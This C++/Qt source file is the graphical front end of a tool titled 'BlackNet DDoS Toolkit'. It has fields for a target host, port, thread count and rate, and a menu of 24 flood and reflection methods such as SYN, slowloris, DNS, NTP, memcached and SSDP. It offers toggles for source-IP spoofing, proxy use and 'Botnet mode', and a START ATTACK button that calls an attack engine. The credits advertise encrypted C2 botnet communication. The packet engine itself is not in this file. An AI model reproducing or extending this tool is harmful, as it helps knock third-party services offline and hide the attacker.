#include "GUI.h"
#include "Utilities.h"
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QGridLayout>
#include <QGroupBox>
#include <QApplication>
#include <QMessageBox>
#include <QFont>
#include <QDateTime>
#include <QFileDialog>
#include <QInputDialog>
#include <QDir>
#include <QJsonDocument>
#include <QJsonObject>
#include <QMetaObject>
#include <thread>
#include <QJsonArray>
#include <QDesktopServices>
#include <QUrl>
#include <QFile>
#include <QPainterPath>
#include <cmath>
#include <chrono>

using namespace std;

ChartWidget::ChartWidget(QWidget* parent) : QWidget(parent), max_value(1) {
    setMinimumHeight(120);
    setMaximumHeight(180);
    setStyleSheet("background: transparent;");
}

void ChartWidget::add_point(double bps) {
    points.append(bps);
    if (points.size() > MAX_POINTS)
        points.removeFirst();
    if (bps > max_value)
        max_value = bps;
    if (max_value < 1) max_value = 1;
    update();
}

void ChartWidget::clear() {
    points.clear();
    max_value = 1;
    update();
}

void ChartWidget::paintEvent(QPaintEvent*) {
    QPainter p(this);
    p.setRenderHint(QPainter::Antialiasing);
    p.fillRect(rect(), QColor(10, 10, 30));

    if (points.size() < 2) {
        p.setPen(QColor(80, 80, 100));
        p.setFont(QFont("Monospace", 9));
        p.drawText(rect(), Qt::AlignCenter, "Bandwidth (waiting for data...)");
        return;
    }

    int w = width();
    int h = height();
    int pad = 10;
    int graph_w = w - 2 * pad;
    int graph_h = h - 2 * pad;

    QLinearGradient grad(0, 0, 0, h);
    grad.setColorAt(0, QColor(0, 212, 255, 40));
    grad.setColorAt(1, QColor(0, 212, 255, 2));

    QPainterPath path;
    path.moveTo(pad, h - pad);

    for (int i = 0; i < points.size(); i++) {
        double x = pad + (double)i / (points.size() - 1) * graph_w;
        double y = h - pad - (points[i] / max_value) * graph_h;
        path.lineTo(x, y);
    }

    path.lineTo(pad + graph_w, h - pad);
    path.closeSubpath();
    p.fillPath(path, grad);

    QPainterPath line;
    for (int i = 0; i < points.size(); i++) {
        double x = pad + (double)i / (points.size() - 1) * graph_w;
        double y = h - pad - (points[i] / max_value) * graph_h;
        if (i == 0) line.moveTo(x, y);
        else line.lineTo(x, y);
    }
    p.setPen(QPen(QColor(0, 212, 255), 2));
    p.drawPath(line);

    p.setPen(QColor(0, 170, 255));
    p.setFont(QFont("Monospace", 8));
    p.drawText(pad, pad + 12, Utilities::format_bps((uint64_t)max_value).c_str());
}

GUI::GUI(AttackEngine& engine, ProxyManager& proxy, BotManager& bot)
    : engine(engine), proxy(proxy), bot(bot),
      attacking(false), current_target_idx(0), last_bytes(0) {
    setup_ui();
    apply_theme();
    stats_timer = new QTimer(this);
    connect(stats_timer, &QTimer::timeout, this, &GUI::refresh_stats);
    chart_timer = new QTimer(this);
    connect(chart_timer, &QTimer::timeout, this, &GUI::refresh_bot_list);
    chart_timer->start(5000);
}

GUI::~GUI() {
    if (stats_timer) stats_timer->stop();
    if (chart_timer) chart_timer->stop();
    if (attacking) engine.stop_attack();
}

void GUI::apply_theme() {
    setStyleSheet(
        "QWidget { background: #0a0a1a; color: #c0c0d0; font-family: monospace; }"
        "QGroupBox { border: 1px solid #2a2a5a; border-radius: 4px; margin-top: 10px; "
        "padding-top: 15px; font-weight: bold; }"
        "QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }"
        "QLineEdit { background: #12122a; border: 1px solid #2a2a5a; border-radius: 3px; "
        "padding: 4px; color: #e0e0f0; }"
        "QComboBox { background: #12122a; border: 1px solid #2a2a5a; border-radius: 3px; "
        "padding: 4px; color: #e0e0f0; }"
        "QComboBox::drop-down { border: none; }"
        "QComboBox QAbstractItemView { background: #12122a; color: #e0e0f0; }"
        "QPushButton { background: #1a1a3a; color: #00d4ff; border: 1px solid #00aaff; "
        "border-radius: 4px; padding: 6px 14px; font-weight: bold; }"
        "QPushButton:hover { background: #2a2a5a; }"
        "QPushButton:pressed { background: #0a0a20; }"
        "QPushButton:disabled { background: #0d0d1a; color: #555566; border-color: #333344; }"
        "QLabel { color: #a0a0b0; }"
        "QCheckBox { color: #a0a0b0; }"
        "QCheckBox::indicator { width: 14px; height: 14px; }"
        "QTextEdit { background: #0d0d1a; border: 1px solid #2a2a5a; border-radius: 3px; "
        "color: #88bbdd; font-family: monospace; font-size: 11px; }"
        "QProgressBar { border: 1px solid #2a2a5a; border-radius: 3px; text-align: center; "
        "background: #0d0d1a; color: #00d4ff; }"
        "QProgressBar::chunk { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, "
        "stop:0 #0066aa, stop:1 #00d4ff); border-radius: 2px; }"
        "QTableWidget { background: #0d0d1a; border: 1px solid #2a2a5a; color: #c0c0d0; }"
        "QHeaderView::section { background: #1a1a3a; color: #00d4ff; border: 1px solid #2a2a5a; "
        "padding: 4px; }");
}

void GUI::setup_ui() {
    setWindowTitle("BlackNet DDoS Toolkit v2.0 - Elite Edition");
    setMinimumSize(820, 720);
    resize(880, 760);

    QFont label_font("Monospace", 10);
    QFont field_font("Monospace", 10);

    QVBoxLayout* main_layout = new QVBoxLayout(this);
    main_layout->setSpacing(4);
    main_layout->setContentsMargins(8, 8, 8, 8);

    QLabel* title = new QLabel("BLACKNET DDoS TOOLKIT  v2.0");
    title->setAlignment(Qt::AlignCenter);
    title->setStyleSheet(
        "font-size: 16px; font-weight: bold; color: #00d4ff; "
        "background: qlineargradient(x1:0, y1:0, x2:1, y2:0, "
        "stop:0 #0a0a20, stop:0.5 #1a1a3a, stop:1 #0a0a20); "
        "padding: 10px; border-radius: 6px; border: 1px solid #00aaff;");
    main_layout->addWidget(title);

    QHBoxLayout* top_row = new QHBoxLayout();

    QGroupBox* config_group = new QGroupBox("Configuration");
    config_group->setFont(label_font);
    QGridLayout* cfg = new QGridLayout(config_group);
    cfg->setSpacing(5);

    cfg->addWidget(new QLabel("Target:"), 0, 0);
    target_edit = new QLineEdit();
    target_edit->setPlaceholderText("IP or hostname");
    cfg->addWidget(target_edit, 0, 1, 1, 3);

    cfg->addWidget(new QLabel("Method:"), 1, 0);
    method_combo = new QComboBox();
    QStringList methods = {"udp", "tcp", "syn", "ack", "tcpconn", "http", "httpget",
                           "httppost", "https", "http2", "ws", "icmp", "slowloris",
                           "dns", "ntp", "mem", "ssdp", "snmp", "mdns", "cldap",
                           "chargen", "qotd", "rdp", "coap"};
    method_combo->addItems(methods);
    cfg->addWidget(method_combo, 1, 1);

    cfg->addWidget(new QLabel("Port:"), 1, 2);
    port_edit = new QLineEdit("80");
    port_edit->setFixedWidth(60);
    cfg->addWidget(port_edit, 1, 3);

    cfg->addWidget(new QLabel("Threads:"), 2, 0);
    threads_edit = new QLineEdit("100");
    threads_edit->setFixedWidth(60);
    cfg->addWidget(threads_edit, 2, 1);

    cfg->addWidget(new QLabel("Rate:"), 2, 2);
    rate_edit = new QLineEdit("1000");
    rate_edit->setFixedWidth(60);
    cfg->addWidget(rate_edit, 2, 3);

    cfg->addWidget(new QLabel("Size:"), 3, 0);
    size_edit = new QLineEdit("1024");
    size_edit->setFixedWidth(60);
    cfg->addWidget(size_edit, 3, 1);

    cfg->addWidget(new QLabel("Duration:"), 3, 2);
    duration_edit = new QLineEdit("0");
    duration_edit->setFixedWidth(60);
    cfg->addWidget(duration_edit, 3, 3);

    cfg->addWidget(new QLabel("Packets:"), 4, 0);
    packets_edit = new QLineEdit("10000");
    packets_edit->setFixedWidth(80);
    cfg->addWidget(packets_edit, 4, 1);

    cfg->addWidget(new QLabel("Data limit:"), 4, 2);
    data_edit = new QLineEdit("0");
    data_edit->setFixedWidth(80);
    cfg->addWidget(data_edit, 4, 3);

    proxy_check = new QCheckBox("Use proxies");
    proxy_check->setChecked(true);
    cfg->addWidget(proxy_check, 5, 0);

    rand_src_check = new QCheckBox("Random source IP");
    cfg->addWidget(rand_src_check, 5, 1);

    rand_port_check = new QCheckBox("Random source port");
    cfg->addWidget(rand_port_check, 5, 2);

    use_botnet_check = new QCheckBox("Botnet mode");
    cfg->addWidget(use_botnet_check, 5, 3);

    QHBoxLayout* btn_row = new QHBoxLayout();
    start_btn = new QPushButton("START ATTACK");
    start_btn->setFixedHeight(36);
    start_btn->setStyleSheet(
        "QPushButton { background: #004400; color: #00ff00; border: 2px solid #00aa00; "
        "font-size: 14px; font-weight: bold; }"
        "QPushButton:hover { background: #006600; }"
        "QPushButton:pressed { background: #003300; }");
    connect(start_btn, &QPushButton::clicked, this, &GUI::toggle_attack);

    stop_btn = new QPushButton("STOP");
    stop_btn->setFixedHeight(36);
    stop_btn->setEnabled(false);
    stop_btn->setStyleSheet(
        "QPushButton { background: #440000; color: #ff0000; border: 2px solid #aa0000; "
        "font-size: 14px; font-weight: bold; }"
        "QPushButton:hover { background: #660000; }"
        "QPushButton:pressed { background: #330000; }"
        "QPushButton:disabled { background: #1a0a0a; color: #553333; border-color: #332222; }");
    connect(stop_btn, &QPushButton::clicked, this, &GUI::toggle_attack);

    btn_row->addWidget(start_btn);
    btn_row->addWidget(stop_btn);
    cfg->addLayout(btn_row, 6, 0, 1, 4);

    top_row->addWidget(config_group, 2);

    QGroupBox* preset_group = new QGroupBox("Presets");
    preset_group->setFont(label_font);
    QVBoxLayout* preset_layout = new QVBoxLayout(preset_group);
    preset_combo = new QComboBox();
    preset_combo->addItem("Default");
    preset_layout->addWidget(preset_combo);

    QHBoxLayout* preset_btns = new QHBoxLayout();
    save_preset_btn = new QPushButton("Save");
    load_preset_btn = new QPushButton("Load");
    delete_preset_btn = new QPushButton("Del");
    connect(save_preset_btn, &QPushButton::clicked, this, &GUI::save_preset);
    connect(load_preset_btn, &QPushButton::clicked, this, &GUI::load_preset);
    preset_btns->addWidget(save_preset_btn);
    preset_btns->addWidget(load_preset_btn);
    preset_btns->addWidget(delete_preset_btn);
    preset_layout->addLayout(preset_btns);
    preset_layout->addStretch();
    top_row->addWidget(preset_group, 1);

    main_layout->addLayout(top_row);

    QHBoxLayout* mid_row = new QHBoxLayout();

    QGroupBox* stats_group = new QGroupBox("Statistics");
    stats_group->setFont(label_font);
    QGridLayout* stats_layout = new QGridLayout(stats_group);

    status_label = new QLabel("Idle");
    status_label->setStyleSheet("color: #888899; font-weight: bold;");
    stats_layout->addWidget(status_label, 0, 0, 1, 2);

    packets_label = new QLabel("Packets: 0");
    stats_layout->addWidget(packets_label, 1, 0);
    bytes_label = new QLabel("Bytes: 0");
    stats_layout->addWidget(bytes_label, 1, 1);
    rate_label = new QLabel("Rate: 0 bps");
    stats_layout->addWidget(rate_label, 2, 0);
    peak_label = new QLabel("Peak: 0 bps");
    stats_layout->addWidget(peak_label, 2, 1);
    threads_label = new QLabel("Threads: 0");
    stats_layout->addWidget(threads_label, 3, 0);
    time_label = new QLabel("Time: 0s");
    stats_layout->addWidget(time_label, 3, 1);
    proxy_label = new QLabel("Proxies: 0");
    stats_layout->addWidget(proxy_label, 4, 0);

    packet_prog_label = new QLabel("Packets:");
    stats_layout->addWidget(packet_prog_label, 5, 0);
    packet_progress = new QProgressBar();
    packet_progress->setMaximumHeight(18);
    stats_layout->addWidget(packet_progress, 5, 1);

    data_prog_label = new QLabel("Data:");
    stats_layout->addWidget(data_prog_label, 6, 0);
    data_progress = new QProgressBar();
    data_progress->setMaximumHeight(18);
    stats_layout->addWidget(data_progress, 6, 1);

    mid_row->addWidget(stats_group, 1);

    QGroupBox* chart_group = new QGroupBox("Bandwidth");
    chart_group->setFont(label_font);
    QVBoxLayout* chart_layout = new QVBoxLayout(chart_group);
    chart = new ChartWidget();
    chart_layout->addWidget(chart);
    mid_row->addWidget(chart_group, 2);

    main_layout->addLayout(mid_row);

    QGroupBox* log_group = new QGroupBox("Log");
    log_group->setFont(label_font);
    QVBoxLayout* log_layout = new QVBoxLayout(log_group);
    log_edit = new QTextEdit();
    log_edit->setReadOnly(true);
    log_edit->setMaximumHeight(130);
    log_layout->addWidget(log_edit);
    main_layout->addWidget(log_group);

    QHBoxLayout* bottom_bar = new QHBoxLayout();
    QPushButton* credits_btn = new QPushButton("Credits");
    credits_btn->setFont(label_font);
    credits_btn->setFixedWidth(120);
    credits_btn->setStyleSheet(
        "QPushButton { background: #1a1a3a; color: #00d4ff; border: 1px solid #00aaff; "
        "border-radius: 4px; padding: 6px; font-weight: bold; }"
        "QPushButton:hover { background: #2a2a5a; }"
        "QPushButton:pressed { background: #0a0a20; }");
    connect(credits_btn, &QPushButton::clicked, this, &GUI::show_credits);
    bottom_bar->addStretch();
    bottom_bar->addWidget(credits_btn);
    bottom_bar->addStretch();
    main_layout->addLayout(bottom_bar);
}

void GUI::toggle_attack() {
    if (!attacking) {
        string target = target_edit->text().trimmed().toStdString();
        if (target.empty()) {
            QMessageBox::warning(this, "Input Error", "Target cannot be empty.");
            return;
        }
        int port = port_edit->text().toInt();
        if (port < 1 || port > 65535) {
            QMessageBox::warning(this, "Input Error", "Port must be 1-65535.");
            return;
        }
        int threads = threads_edit->text().toInt();
        if (threads < 1 || threads > 10000) {
            QMessageBox::warning(this, "Input Error", "Threads must be 1-10000.");
            return;
        }
        int rate = rate_edit->text().toInt();
        int packet_size = size_edit->text().toInt();
        int duration = duration_edit->text().toInt();
        long long pkt_limit = packets_edit->text().toLongLong();
        long long dat_limit = parse_data_size_gui(data_edit->text());
        string method = method_combo->currentText().toStdString();

        ProxyManager* pm = proxy_check->isChecked() ? &proxy : nullptr;

        engine.start_attack(target, port, method, threads, rate, packet_size,
                            rand_src_check->isChecked(), rand_port_check->isChecked(),
                            pm, pkt_limit, dat_limit);

        attacking = true;
        start_btn->setEnabled(false);
        stop_btn->setEnabled(true);
        status_label->setText("Attacking");
        status_label->setStyleSheet("color: #00ff00; font-weight: bold;");
        log("Attack started: " + QString::fromStdString(method) + " -> " +
            QString::fromStdString(target) + ":" + QString::number(port));

        stats_timer->start(1000);
    } else {
        engine.stop_attack();
        attacking = false;
        start_btn->setEnabled(true);
        stop_btn->setEnabled(false);
        status_label->setText("Stopped");
        status_label->setStyleSheet("color: #ff6600; font-weight: bold;");
        stats_timer->stop();
        log("Attack stopped by user.");
    }
}

void GUI::refresh_stats() {
    if (!attacking) return;
    auto stats = engine.get_stats();
    packets_label->setText("Packets: " + QString::fromStdString(Utilities::format_number(stats.packets_sent)));
    bytes_label->setText("Bytes: " + QString::fromStdString(Utilities::format_bytes(stats.bytes_sent)));
    rate_label->setText("Rate: " + QString::fromStdString(Utilities::format_bps(stats.current_bps)));
    peak_label->setText("Peak: " + QString::fromStdString(Utilities::format_bps(stats.peak_bps)));
    threads_label->setText("Threads: " + QString::number(stats.active_threads));
    time_label->setText("Time: " + QString::fromStdString(Utilities::format_duration(stats.duration)));
    proxy_label->setText("Proxies: " + QString::number(proxy.get_total_proxies()));
    chart->add_point(stats.current_bps);

    if (!engine.is_running()) {
        attacking = false;
        start_btn->setEnabled(true);
        stop_btn->setEnabled(false);
        status_label->setText("Completed");
        status_label->setStyleSheet("color: #00aaff; font-weight: bold;");
        stats_timer->stop();
        log("Attack completed.");
    }
}

void GUI::save_preset() {
    QString name = QInputDialog::getText(this, "Save Preset", "Preset name:");
    if (name.isEmpty()) return;
    QSettings settings("blacknet", "presets");
    settings.beginGroup(name);
    settings.setValue("target", target_edit->text());
    settings.setValue("method", method_combo->currentText());
    settings.setValue("port", port_edit->text());
    settings.setValue("threads", threads_edit->text());
    settings.setValue("rate", rate_edit->text());
    settings.setValue("size", size_edit->text());
    settings.setValue("duration", duration_edit->text());
    settings.setValue("packets", packets_edit->text());
    settings.setValue("data", data_edit->text());
    settings.endGroup();
    preset_combo->addItem(name);
    log("Preset saved: " + name);
}

void GUI::load_preset() {
    QString name = preset_combo->currentText();
    if (name.isEmpty()) return;
    QSettings settings("blacknet", "presets");
    settings.beginGroup(name);
    target_edit->setText(settings.value("target", "").toString());
    int idx = method_combo->findText(settings.value("method", "udp").toString());
    if (idx >= 0) method_combo->setCurrentIndex(idx);
    port_edit->setText(settings.value("port", "80").toString());
    threads_edit->setText(settings.value("threads", "100").toString());
    rate_edit->setText(settings.value("rate", "1000").toString());
    size_edit->setText(settings.value("size", "1024").toString());
    duration_edit->setText(settings.value("duration", "0").toString());
    packets_edit->setText(settings.value("packets", "10000").toString());
    data_edit->setText(settings.value("data", "0").toString());
    settings.endGroup();
    log("Preset loaded: " + name);
}

void GUI::resolve_target() {
    string target = target_edit->text().trimmed().toStdString();
    if (target.empty()) return;
    string resolved = Utilities::resolve_dns(target);
    log("Resolved: " + QString::fromStdString(target) + " -> " + QString::fromStdString(resolved));
}

void GUI::refresh_bot_list() {}

void GUI::add_bot_dialog() {}

long long GUI::parse_data_size_gui(const QString& text) {
    return Utilities::parse_data_size(text.toStdString());
}

void GUI::show_report() {
    auto stats = engine.get_stats();
    QString report;
    report += "BLACKNET ATTACK REPORT\n";
    report += "======================\n\n";
    report += "Packets sent: " + QString::fromStdString(Utilities::format_number(stats.packets_sent)) + "\n";
    report += "Bytes sent: " + QString::fromStdString(Utilities::format_bytes(stats.bytes_sent)) + "\n";
    report += "Duration: " + QString::fromStdString(Utilities::format_duration(stats.duration)) + "\n";
    report += "Peak rate: " + QString::fromStdString(Utilities::format_bps(stats.peak_bps)) + "\n";
    report += "Errors: " + QString::number(stats.errors) + "\n";

    QMessageBox msg(this);
    msg.setWindowTitle("Attack Report");
    msg.setText(report);
    msg.setStyleSheet("QMessageBox { background-color: #0d0d1a; color: #c0c0d0; } "
                      "QPushButton { background: #1a2a4a; color: #88bbdd; border: 1px solid #2a4a6a; "
                      "border-radius: 3px; padding: 6px 18px; }");
    msg.exec();
}

void GUI::log(const QString& msg) {
    QString timestamp = QDateTime::currentDateTime().toString("[hh:mm:ss] ");
    log_edit->append(timestamp + msg);
    log_buffer.append(msg);
    if (log_buffer.size() > 500) log_buffer.removeFirst();
}

void GUI::show_credits() {
    QDialog* dlg = new QDialog(this);
    dlg->setWindowTitle("Credits");
    dlg->setFixedSize(420, 340);
    dlg->setStyleSheet(
        "QDialog { background: qlineargradient(x1:0, y1:0, x2:0, y2:1, "
        "stop:0 #0a0a20, stop:1 #0d0d2a); }"
        "QLabel { color: #c0c0d0; }");

    QVBoxLayout* layout = new QVBoxLayout(dlg);
    layout->setSpacing(12);
    layout->setContentsMargins(30, 25, 30, 25);

    QLabel* cr_title = new QLabel("BLACKNET v2.0");
    cr_title->setAlignment(Qt::AlignCenter);
    cr_title->setStyleSheet("font-size: 20px; font-weight: bold; color: #00d4ff; font-family: monospace;");
    layout->addWidget(cr_title);

    QLabel* divider = new QLabel(QString::fromUtf8("\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550"));
    divider->setAlignment(Qt::AlignCenter);
    divider->setStyleSheet("color: #00aaff; font-size: 12px;");
    layout->addWidget(divider);

    QLabel* madeby = new QLabel("Made by");
    madeby->setAlignment(Qt::AlignCenter);
    madeby->setStyleSheet("font-size: 12px; color: #888899;");
    layout->addWidget(madeby);

    QLabel* author = new QLabel("lolhecksv2");
    author->setAlignment(Qt::AlignCenter);
    author->setStyleSheet("font-size: 22px; font-weight: bold; color: #00d4ff; font-family: monospace;");
    layout->addWidget(author);

    QLabel* divider2 = new QLabel(QString::fromUtf8("\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550"));
    divider2->setAlignment(Qt::AlignCenter);
    divider2->setStyleSheet("color: #00aaff; font-size: 12px;");
    layout->addWidget(divider2);

    QLabel* features = new QLabel(
        "26 attack protocols\n"
        "Military-grade passcode protection\n"
        "Encrypted C2 botnet communication\n"
        "Auto-update system\n"
        "Qt5 graphical interface\n"
        "Proxy rotation & geo-targeting");
    features->setAlignment(Qt::AlignCenter);
    features->setStyleSheet("font-size: 11px; color: #888899; font-family: monospace;");
    layout->addWidget(features);

    layout->addStretch();

    QLabel* copyright = new QLabel(QString::fromUtf8("\u00a9 2025 blacknet \u2014 all rights reserved"));
    copyright->setAlignment(Qt::AlignCenter);
    copyright->setStyleSheet("font-size: 10px; color: #555566;");
    layout->addWidget(copyright);

    QPushButton* close_btn = new QPushButton("Close");
    close_btn->setStyleSheet(
        "QPushButton { background: #1a1a3a; color: #00d4ff; border: 1px solid #00aaff; "
        "border-radius: 4px; padding: 8px 30px; font-weight: bold; font-family: monospace; }"
        "QPushButton:hover { background: #2a2a5a; }"
        "QPushButton:pressed { background: #0a0a20; }");
    connect(close_btn, &QPushButton::clicked, dlg, &QDialog::accept);
    layout->addWidget(close_btn, 0, Qt::AlignCenter);

    dlg->exec();
    delete dlg;
}
